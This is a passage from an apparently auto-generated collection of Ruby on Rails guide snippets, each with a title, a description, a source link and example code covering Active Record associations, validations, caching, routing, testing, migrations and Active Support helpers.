\"rails-deprecated_sanitizer\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Cookies Serializer to MessagePack - Ruby on Rails - Ruby\nDESCRIPTION: Demonstrates how to set the cookies serializer to MessagePack in a Rails application's configuration. This enables the serialization of cookies using the more efficient MessagePack format instead of the default JSON. Intended for use in config files like 'config/application.rb' or environment files.\n\n- Dependencies: Rails >= 7.1, msgpack gem\n- Parameter: 'config.action_dispatch.cookies_serializer'\n- Input/Output: All cookies will now use MessagePack serialization.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_dispatch.cookies_serializer = :message_pack\n```\n\n----------------------------------------\n\nTITLE: Using ActiveModel::API for Model-Like Objects\nDESCRIPTION: This snippet demonstrates how to include `ActiveModel::API` in a Ruby class to enable features like attribute assignment, conversion, naming, translation, and validations. It showcases how the resulting object can be used with Action View helpers, similar to Active Record objects, to deliver emails if the object is valid.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nclass EmailContact\n  include ActiveModel::API\n\n  attr_accessor :name, :email, :message\n  validates :name, :email, :message, presence: true\n\n  def deliver\n    if valid?\n      # Deliver email\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rails Command Help Output\nDESCRIPTION: Shows the help output of Rails CLI, listing available commands and their descriptions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ rails --help\nUsage:\n  bin/rails COMMAND [options]\n\nYou must specify a command. The most common commands are:\n\n  generate     Generate new code (short-cut alias: \"g\")\n  console      Start the Rails console (short-cut alias: \"c\")\n  server       Start the Rails server (short-cut alias: \"s\")\n  ...\n\nAll commands can be run with -h (or --help) for more information.\n\nIn addition to those commands, there are:\nabout                               List versions of all Rails ...\nassets:clean[keep]                  Remove old compiled assets\nassets:clobber                      Remove compiled assets\nassets:environment                  Load asset compile environment\nassets:precompile                   Compile all the assets ...\n...\ndb:fixtures:load                    Load fixtures into the ...\ndb:migrate                          Migrate the database ...\ndb:migrate:status                   Display status of migrations\ndb:rollback                         Roll the schema back to ...\ndb:schema:cache:clear               Clears a db/schema_cache.yml file\ndb:schema:cache:dump                Create a db/schema_cache.yml file\ndb:schema:dump                      Create a database schema file (either db/schema.rb or db/structure.sql ...\ndb:schema:load                      Load a database schema file (either db/schema.rb or db/structure.sql ...\ndb:seed                             Load the seed data ...\ndb:version                          Retrieve the current schema ...\n...\nrestart                             Restart app by touching ...\ntmp:create                          Create tmp directories ...\n```\n\n----------------------------------------\n\nTITLE: Configuring CDN Routes for Active Storage in Ruby on Rails\nDESCRIPTION: This code snippet demonstrates how to set up routes in Rails to use a CDN for serving Active Storage attachments. It defines a custom URL helper that generates CDN-friendly URLs for both direct blobs and their variations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\n# config/routes.rb\ndirect :cdn_image do |model, options|\n  expires_in = options.delete(:expires_in) { ActiveStorage.urls_expire_in }\n\n  if model.respond_to?(:signed_id)\n    route_for(\n      :rails_service_blob_proxy,\n      model.signed_id(expires_in: expires_in),\n      model.filename,\n      options.merge(host: ENV[\"CDN_HOST\"])\n    )\n  else\n    signed_blob_id = model.blob.signed_id(expires_in: expires_in)\n    variation_key  = model.variation.key\n    filename       = model.blob.filename\n\n    route_for(\n      :rails_blob_representation_proxy,\n      signed_blob_id,\n      variation_key,\n      filename,\n      options.merge(host: ENV[\"CDN_HOST\"])\n    )\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Setting the RAILS_ENV Environment Variable (Ruby)\nDESCRIPTION: This `set_environment` method, part of the `Rails::Server` initialization process, ensures the `RAILS_ENV` environment variable is set correctly. It checks if `RAILS_ENV` is already defined; if not, it assigns the value specified in the `:environment` key of the server's `options` hash (which typically comes from the `--environment` command-line flag or defaults to 'development').\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Rails\n  module Server\n    def set_environment\n      ENV[\"RAILS_ENV\"] ||= options[:environment]\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Checking Association Change States via *_changed? Methods - Ruby\nDESCRIPTION: Demonstrates use of association_changed? and association_previously_changed? to track whether the associated record has been changed or replaced and saved. Shows state before and after assignment and persisting the Book object. Relies on ActiveRecord's dirty tracking.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\n@book.author # => #<Author author_number: 123, author_name: \\\"John Doe\\\">\\n@book.author_changed? # => false\\n@book.author_previously_changed? # => false\\n\\n@book.author = Author.second # => #<Author author_number: 456, author_name: \\\"Jane Smith\\\">\\n@book.author_changed? # => true\\n\\n@book.save!\\n@book.author_changed? # => false\\n@book.author_previously_changed? # => true\n```\n\n----------------------------------------\n\nTITLE: Conditional GET with stale?\nDESCRIPTION: This snippet shows how to implement conditional GETs using the `stale?` method in a Rails controller. It checks if the request is stale based on the product's `updated_at` timestamp and `cache_key_with_version` ETag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  def show\n    @product = Product.find(params[:id])\n\n    # If the request is stale according to the given timestamp and etag value\n    # (i.e. it needs to be processed again) then execute this block\n    if stale?(last_modified: @product.updated_at.utc, etag: @product.cache_key_with_version)\n      respond_to do |wants|\n        # ... normal response processing\n      end\n    end\n\n    # If the request is fresh (i.e. it's not modified) then you don't need to do\n    # anything. The default render checks for this using the parameters\n    # used in the previous call to stale? and will automatically send a\n    # :not_modified. So that's it, you're done.\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Testing View Partials with assert_dom - Ruby\nDESCRIPTION: Demonstrates testing a view partial using `assert_dom` to verify the presence of a specific HTML element with expected attributes and text. It creates an `Article` object, renders the `articles/article` partial, and checks if an `<a>` tag with the correct `href` and text is present in the rendered output. This snippet is enhanced with view helper assertions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_91\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"renders a link to itself\" do\n  article = Article.create! title: \"Hello, world\"\n\n  render \"articles/article\", article: article\n\n  assert_dom \"a[href=?]\", article_url(article), text: article.title\nend\n```\n\n----------------------------------------\n\nTITLE: Illustrating Validation Failure with `create` in IRB\nDESCRIPTION: An Interactive Ruby (IRB) session showing the behavior of the `create` method when validation fails. `User.create` attempts to instantiate and save the object; if validation fails, it still returns the newly created (but unsaved) `User` object. Error details can be accessed via the `errors` attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_22\n\nLANGUAGE: irb\nCODE:\n```\nirb> user = User.create\n=> #<User:0x000000013e8b5008 id: nil, name: nil>\nirb> user.errors.full_messages\n=> [\"Name can't be blank\"]\n```\n\n----------------------------------------\n\nTITLE: Joining Nested Associations (Single Level) in Rails\nDESCRIPTION: This example demonstrates how to join nested associations (`reviews` and `customer`) through the `books` table using the `joins` method. It fetches all `Book` objects that have a `review` associated with a `customer`. The SQL query joins the `books`, `reviews`, and `customers` tables based on their respective foreign keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_141\n\nLANGUAGE: ruby\nCODE:\n```\nBook.joins(reviews: :customer)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.* FROM books\n  INNER JOIN reviews ON reviews.book_id = books.id\n  INNER JOIN customers ON customers.id = reviews.customer_id\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Class Method Tests for yaffle_text_field - MiniTest - Ruby\nDESCRIPTION: These tests confirm that models 'Hickwall' and 'Wickwall' report the expected yaffle_text_field value based on whether a custom option is provided. Relies on the plugin adding both the class method and correct configuration. Tests should be run with bin/test.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n# yaffle/test/acts_as_yaffle_test.rb\n\nrequire \"test_helper\"\n\nclass ActsAsYaffleTest < ActiveSupport::TestCase\n  def test_a_hickwalls_yaffle_text_field_should_be_last_squawk\n    assert_equal \"last_squawk\", Hickwall.yaffle_text_field\n  end\n\n  def test_a_wickwalls_yaffle_text_field_should_be_last_tweet\n    assert_equal \"last_tweet\", Wickwall.yaffle_text_field\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Getting previous/next quarter with prev_quarter/next_quarter in Rails\nDESCRIPTION: The `prev_quarter` and `next_quarter` methods in Rails' Active Support return a Time object representing the previous or next quarter respectively, maintaining the day of the month. If the day of the month doesn't exist in the resulting month, the last day of that month is used. `prev_quarter` is aliased to `last_quarter`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_171\n\nLANGUAGE: ruby\nCODE:\n```\nt = Time.local(2010, 5, 8) # => 2010-05-08 00:00:00 +0300\nt.prev_quarter             # => 2010-02-08 00:00:00 +0200\nt.next_quarter             # => 2010-08-08 00:00:00 +0300\n```\n\nLANGUAGE: ruby\nCODE:\n```\nTime.local(2000, 7, 31).prev_quarter  # => 2000-04-30 00:00:00 +0300\nTime.local(2000, 5, 31).prev_quarter  # => 2000-02-29 00:00:00 +0200\nTime.local(2000, 10, 31).prev_quarter # => 2000-07-31 00:00:00 +0300\nTime.local(2000, 11, 31).next_quarter # => 2001-03-01 00:00:00 +0200\n```\n\n----------------------------------------\n\nTITLE: Defining default parameters using class_attribute in ActionMailer\nDESCRIPTION: This code snippet demonstrates the usage of `class_attribute` to define default parameters in `ActionMailer::Base`. The `default_params` attribute is initialized with a hash containing configuration options like `mime_version`, `charset`, `content_type`, and `parts_order`. The `freeze` method is called on the hash to prevent accidental modifications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nclass_attribute :default_params\nself.default_params = {\n  mime_version: \"1.0\",\n  charset: \"UTF-8\",\n  content_type: \"text/plain\",\n  parts_order: [ \"text/plain\", \"text/enriched\", \"text/html\" ]\n}.freeze\n```\n\n----------------------------------------\n\nTITLE: Enabling ActiveRecord SQL Query Comments in Ruby\nDESCRIPTION: Configures Rails ActiveRecord to automatically append contextual comments to generated SQL statements. These comments, following the SQLCommenter format by default, help trace queries back to the originating controller action or background job. This setting is typically placed in `application.rb` or an environment initializer. Enabling this feature disables prepared statements, as the added comments make most queries unique.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_9\n\nLANGUAGE: rb\nCODE:\n```\nconfig.active_record.query_log_tags_enabled = true\n```\n\n----------------------------------------\n\nTITLE: Testing Acts as Yaffle Functionality in Ruby on Rails\nDESCRIPTION: This code snippet contains unit tests for the Acts as Yaffle plugin, checking the yaffle_text_field and squawk methods for different model classes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ActsAsYaffleTest < ActiveSupport::TestCase\n  def test_a_hickwalls_yaffle_text_field_should_be_last_squawk\n    assert_equal \"last_squawk\", Hickwall.yaffle_text_field\n  end\n\n  def test_a_wickwalls_yaffle_text_field_should_be_last_tweet\n    assert_equal \"last_tweet\", Wickwall.yaffle_text_field\n  end\n\n  def test_hickwalls_squawk_should_populate_last_squawk\n    hickwall = Hickwall.new\n    hickwall.squawk(\"Hello World\")\n    assert_equal \"squawk! Hello World\", hickwall.last_squawk\n  end\n\n  def test_wickwalls_squawk_should_populate_last_tweet\n    wickwall = Wickwall.new\n    wickwall.squawk(\"Hello World\")\n    assert_equal \"squawk! Hello World\", wickwall.last_tweet\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering a Partial with Locals in Rails\nDESCRIPTION: This example demonstrates how to pass data to a partial using the `locals` option. The `@product` instance variable from the `show.html.erb` view is passed to the `_product.html.erb` partial as a local variable named `my_product`. The partial then uses this local variable to display the product's name within a div with an ID generated by `dom_id`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_13\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/products/show.html.erb %>\n\n<%= render partial: \"product\", locals: { my_product: @product } %>\n\n<%# app/views/products/_product.html.erb %>\n\n<%= tag.div id: dom_id(my_product) do %>\n  <h1><%= my_product.name %></h1>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Substring from Position\nDESCRIPTION: This snippet demonstrates extracting a substring from a string starting at a specific position using the `from` method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_59\n\nLANGUAGE: ruby\nCODE:\n```\n\"hello\".from(0)  # => \"hello\"\n\"hello\".from(2)  # => \"llo\"\n\"hello\".from(-2) # => \"lo\"\n\"hello\".from(10) # => nil\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Validation Contexts in Rails\nDESCRIPTION: This snippet demonstrates how to define custom validation contexts for multi-step forms or scenario-based validations. Each validation method is associated with a specific context using the on option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_59\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  validate :personal_information, on: :personal_info\n  validate :contact_information, on: :contact_info\n  validate :location_information, on: :location_info\n\n  private\n    def personal_information\n      errors.add(:base, \"Name must be present\") if first_name.blank?\n      errors.add(:base, \"Age must be at least 18\") if age && age < 18\n    end\n\n    def contact_information\n      errors.add(:base, \"Email must be present\") if email.blank?\n      errors.add(:base, \"Phone number must be present\") if phone.blank?\n    end\n\n    def location_information\n      errors.add(:base, \"Address must be present\") if address.blank?\n      errors.add(:base, \"City must be present\") if city.blank?\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Delete Button in Show View - ERB\nDESCRIPTION: This ERB snippet adds a \"Delete\" button to the product show page.  It uses `button_to` helper to create a form that submits a DELETE request to the product's path. It includes a `turbo_confirm` attribute to prompt the user for confirmation before deleting.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_65\n\nLANGUAGE: erb\nCODE:\n```\n<h1><%= @product.name %></h1>\n\n<%= link_to \"Back\", products_path %>\n<%= link_to \"Edit\", edit_product_path(@product) %>\n<%= button_to \"Delete\", @product, method: :delete, data: { turbo_confirm: \"Are you sure?\" } %>\n```\n\n----------------------------------------\n\nTITLE: Linking JavaScript packages for local development\nDESCRIPTION: Commands to use yarn link for connecting a local ActiveStorage branch to a test application for JavaScript development.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\n$ cd rails/activestorage\n$ yarn link\n$ cd ~/my-test-app\n$ yarn link \"@rails/activestorage\"\n```\n\n----------------------------------------\n\nTITLE: Generating Delegated Models for Delegated Types\nDESCRIPTION: Commands to generate Message and Comment models for use with delegated types, each with their own specific attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_84\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model message subject:string body:string\n$ bin/rails generate model comment content:string\n```\n\n----------------------------------------\n\nTITLE: Testing Article Creation with Flash Notice - Ruby\nDESCRIPTION: This Ruby code demonstrates how to test the successful creation of an article and verify the presence of a flash notice.  It asserts that the article count increases, the user is redirected to the article's show page, and the flash[:notice] contains the expected message. Dependencies include the Article model and routing configured for articles.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"should create article\" do\n  assert_difference(\"Article.count\") do\n    post articles_url, params: { article: { title: \"Some title\" } }\n  end\n\n  assert_redirected_to article_path(Article.last)\n  assert_equal \"Article was successfully created.\", flash[:notice]\nend\n```\n\n----------------------------------------\n\nTITLE: Cross-Module Associations with Explicit Class Names\nDESCRIPTION: Example showing how to create associations between models in different modules by using the class_name option to specify the full namespace path to the related model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_103\n\nLANGUAGE: ruby\nCODE:\n```\nmodule MyApplication\n  module Business\n    class Supplier < ApplicationRecord\n      has_one :account,\n        class_name: \"MyApplication::Billing::Account\"\n    end\n  end\n\n  module Billing\n    class Account < ApplicationRecord\n      belongs_to :supplier,\n        class_name: \"MyApplication::Business::Supplier\"\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: HTML Output for select Helper with Disabled Option - HTML\nDESCRIPTION: Demonstrates the HTML output of a Rails select helper call where one option (private) is disabled. Shows the disabled attribute in the generated select/option tags. Serves to clarify how disabled options appear in the rendered HTML form.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_18\n\nLANGUAGE: html\nCODE:\n```\n<select name=\\\"post[category]\\\">\\n<option>story</option>\\n<option>joke</option>\\n<option>poem</option>\\n<option disabled=\\\"disabled\\\">private</option>\\n</select>\n```\n\n----------------------------------------\n\nTITLE: Including Fully Implemented Yaffle::ActsAsYaffle in ApplicationRecord - Rails Model Inheritance - Ruby\nDESCRIPTION: Ensures ApplicationRecord includes the final, fully configured Yaffle::ActsAsYaffle module so that newly introduced class and instance methods are available to model subclasses. 'self.abstract_class' prevents it from being instantiated directly. Requires yaffle plugin as a dependency.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\n# test/dummy/app/models/application_record.rb\n\nclass ApplicationRecord < ActiveRecord::Base\n  include Yaffle::ActsAsYaffle\n\n  self.abstract_class = true\nend\n```\n\n----------------------------------------\n\nTITLE: Processing Action Mailbox Example Data Structure\nDESCRIPTION: Example of the data structure passed during Action Mailbox processing event showing mailbox instance and inbound email information.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  mailbox: #<RepliesMailbox:0x00007f9f7a8388>,\n  inbound_email: {\n    id: 1,\n    message_id: \"0CB459E0-0336-41DA-BC88-E6E28C697DDB@37signals.com\",\n    status: \"processing\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Nested Associations with ActiveRecord - Ruby\nDESCRIPTION: Defines a Customer model in Ruby on Rails with a has_many association to orders and enables nested attributes with the :allow_destroy option. This setup is required to enable nested object forms in Action View, allowing child objects (orders) to be created, updated, or destroyed via the parent form. Prerequisites include an ActiveRecord model and Rails 2.3 or newer; expects related Order model and appropriate schema.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nclass Customer < ActiveRecord::Base\\n  has_many :orders\\n\\n  accepts_nested_attributes_for :orders, :allow_destroy => true\\nend\n```\n\n----------------------------------------\n\nTITLE: Deleting an Author and Their Books With Associations in Ruby on Rails\nDESCRIPTION: This snippet shows how to delete an author and all their associated books using the dependent: :destroy option in the association.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_6\n\nLANGUAGE: Ruby\nCODE:\n```\n@author.destroy\n```\n\n----------------------------------------\n\nTITLE: Running All Active Record Adapter Tests in Bash\nDESCRIPTION: Executes the default `test` Rake task within the `activerecord` directory. This typically runs the test suite sequentially against SQLite3, MySQL (using configured adapters like mysql2/trilogy), and PostgreSQL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_28\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake test\n```\n\n----------------------------------------\n\nTITLE: Displaying Author Name in Article View\nDESCRIPTION: ERB code to display the author's name on the article's page in the Blorgh engine.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_44\n\nLANGUAGE: html+erb\nCODE:\n```\n<p>\n  <strong>Author:</strong>\n  <%= article.author.name %>\n</p>\n```\n\n----------------------------------------\n\nTITLE: HTTP ETag Support Implementation in Rails Controller\nDESCRIPTION: Example showing how to implement HTTP ETag and last-modified headers support in a Rails controller using stale? and fresh_when methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nclass ArticlesController < ApplicationController\n  def show_with_respond_to_block\n    @article = Article.find(params[:id])\n\n    # If the request sends headers that differs from the options provided to stale?, then\n    # the request is indeed stale and the respond_to block is triggered (and the options\n    # to the stale? call is set on the response).\n    #\n    # If the request headers match, then the request is fresh and the respond_to block is\n    # not triggered. Instead, the default render will occur, which will check the last-modified\n    # and etag headers and conclude that it only needs to send a \"304 Not Modified\" instead\n    # of rendering the template.\n    if stale?(:last_modified => @article.published_at.utc, :etag => @article)\n      respond_to do |wants|\n        # normal response processing\n      end\n    end\n  end\n\n  def show_with_implied_render\n    @article = Article.find(params[:id])\n\n    # Sets the response headers and checks them against the request, if the request is stale\n    # (i.e. no match of either etag or last-modified), then the default render of the template happens.\n    # If the request is fresh, then the default render will return a \"304 Not Modified\"\n    # instead of rendering the template.\n    fresh_when(:last_modified => @article.published_at.utc, :etag => @article)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating ApplicationRecord Class for Rails 5 Upgrade\nDESCRIPTION: Code for creating the ApplicationRecord base class when upgrading from Rails 4.2 to Rails 5.0. All models should inherit from this class instead of ActiveRecord::Base in Rails 5.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationRecord < ActiveRecord::Base\n  self.abstract_class = true\nend\n```\n\n----------------------------------------\n\nTITLE: Placeholder for Initialization Code in Ruby\nDESCRIPTION: This is a placeholder comment indicating where initialization code should be added, likely within a Ruby file such as `config/initializers/core_extensions.rb` created by a Rails generator.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\n# Add initialization content here\n```\n\n----------------------------------------\n\nTITLE: Spacer Template Usage\nDESCRIPTION: This code snippet illustrates using the `:spacer_template` option to render a second partial between instances of the main partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_94\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: @products, spacer_template: \"product_ruler\" %>\n```\n\n----------------------------------------\n\nTITLE: Direct Route with Model Argument in Rails\nDESCRIPTION: This code snippet defines a direct route `commentable` that takes a model as an argument and returns an array suitable for `url_for`.  It constructs the URL using the model and adds an anchor.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_59\n\nLANGUAGE: ruby\nCODE:\n```\ndirect :commentable do |model|\n  [ model, anchor: model.dom_id ]\nend\n```\n\n----------------------------------------\n\nTITLE: Example of IRB Documentation Format\nDESCRIPTION: Shows how to document IRB (Interactive Ruby) examples with the correct `irb>` prefix for commands and `=>` prefix for output results to distinguish them from regular code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\n# Find the customer with primary key (id) 10.\n#   irb> customer = Customer.find(10)\n#   # => #<Customer id: 10, first_name: \"Ryan\">\n```\n\n----------------------------------------\n\nTITLE: Creating Migration for Has and Belongs to Many Association in Rails\nDESCRIPTION: Migration that sets up the tables for a has_and_belongs_to_many relationship between assemblies and parts, including a join table without a primary key to establish the many-to-many relationship.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateAssembliesAndParts < ActiveRecord::Migration[8.1]\n  def change\n    create_table :assemblies do |t|\n      t.string :name\n      t.timestamps\n    end\n\n    create_table :parts do |t|\n      t.string :part_number\n      t.timestamps\n    end\n\n    # Create a join table to establish the many-to-many relationship between assemblies and parts.\n    # `id: false` indicates that the table does not need a primary key of its own\n    create_table :assemblies_parts, id: false do |t|\n      # creates foreign keys linking the join table to the `assemblies` and `parts` tables\n      t.belongs_to :assembly\n      t.belongs_to :part\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Files with file\nDESCRIPTION: Demonstrates how to create a file in a specified directory using the `file` method. The example creates a Ruby file in the `app/components` directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nfile \"app/components/foo.rb\", <<-CODE\n  class Foo\n  end\nCODE\n```\n\n----------------------------------------\n\nTITLE: Substring to Position\nDESCRIPTION: This snippet demonstrates extracting a substring from a string up to a specific position using the `to` method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_60\n\nLANGUAGE: ruby\nCODE:\n```\n\"hello\".to(0)  # => \"h\"\n\"hello\".to(2)  # => \"hel\"\n\"hello\".to(-2) # => \"hell\"\n\"hello\".to(10) # => \"hello\"\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of take\nDESCRIPTION: This SQL query shows the equivalent SQL command for the `Customer.take` method in Rails. It selects all columns from the `customers` table and limits the result to 1 record, effectively fetching a single row without any specific order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_15\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Applying a Rails Template to an existing app using app:template\nDESCRIPTION: Shows how to apply a Rails template to an existing Rails application using the `app:template` rake task. The template location is passed via the LOCATION environment variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails app:template LOCATION=~/template.rb\n$ bin/rails app:template LOCATION=http://example.com/template.rb\n```\n\n----------------------------------------\n\nTITLE: Child Model in Single Table Inheritance\nDESCRIPTION: Shows the simple definition of a Car model that inherits from Vehicle in a Single Table Inheritance setup.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_73\n\nLANGUAGE: ruby\nCODE:\n```\nclass Car < Vehicle\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Spring for Test Environment in Rails 6\nDESCRIPTION: This Ruby code demonstrates how to configure Spring for the test environment in Rails 6 by enabling reloading, which is necessary for Spring to work correctly.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\n# config/environments/test.rb\n\nconfig.cache_classes = false\n```\n\n----------------------------------------\n\nTITLE: Validating Attribute Length Constraints in Rails (Ruby)\nDESCRIPTION: Illustrates different ways to use the `length` validator in a `Person` model to constrain the length of attributes. It shows setting a minimum length (`:minimum` for `name`), a maximum length (`:maximum` for `bio`), a required length range (`:in` for `password`), and an exact required length (`:is` for `registration_number`).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :name, length: { minimum: 2 }\n  validates :bio, length: { maximum: 500 }\n  validates :password, length: { in: 6..20 }\n  validates :registration_number, length: { is: 6 }\nend\n```\n\n----------------------------------------\n\nTITLE: Checking Blankness and Presence with Singleton Return - Ruby\nDESCRIPTION: The update ensures that `blank?` and `present?` methods consistently return singleton true/false rather than possibly truthy objects. This clarifies behavior and avoids subtle bugs in conditionals. Applies to all objects supporting these methods within ActiveSupport. Output is always a canonical true or false singleton.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_17\n\nLANGUAGE: Ruby\nCODE:\n```\n\"text\".blank? # => false\nnil.present? # => false\n```\n\n----------------------------------------\n\nTITLE: Disable Automatic Inverse Plural Associations in Ruby\nDESCRIPTION: This code shows how to disable automatic inverse plural associations on a per-model basis. By setting `self.automatically_invert_plural_associations = false` within the `Comment` model, Active Record will not look for a `:comments` association in the `Post` model when trying to establish the inverse association. This can be useful for maintaining backward compatibility with legacy code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nclass Comment < ApplicationRecord\n  self.automatically_invert_plural_associations = false\n\n  belongs_to :post\nend\n```\n\n----------------------------------------\n\nTITLE: Seeding Database with Initial Data - Ruby\nDESCRIPTION: This code snippet shows how to seed a database with initial data using the `db/seeds.rb` file. It iterates through a list of genre names and creates a `MovieGenre` record for each name if it doesn't already exist. The `find_or_create_by!` method ensures idempotency, making it safe to run multiple times.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_75\n\nLANGUAGE: ruby\nCODE:\n```\n[\"Action\", \"Comedy\", \"Drama\", \"Horror\"].each do |genre_name|\n  MovieGenre.find_or_create_by!(name: genre_name)\nend\n```\n\n----------------------------------------\n\nTITLE: Using Left Outer Joins in Rails\nDESCRIPTION: This code snippet demonstrates how to use `left_outer_joins` to select records whether or not they have associated records. It retrieves all customers with their count of reviews, regardless of whether they have any reviews or not. It uses `COUNT(reviews.*)` and `GROUP BY customers.id` to count the reviews for each customer.\nSOURCE: 